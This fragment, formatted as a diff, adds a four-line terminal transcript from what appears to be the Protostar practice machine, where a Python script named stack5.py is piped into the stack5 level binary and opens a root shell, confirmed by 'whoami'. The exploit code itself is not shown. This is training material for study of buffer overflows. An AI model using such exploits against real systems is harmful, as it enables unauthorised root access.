@@ -1,0 +1,4 @@
+user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5
+# whoami
+root
+# 
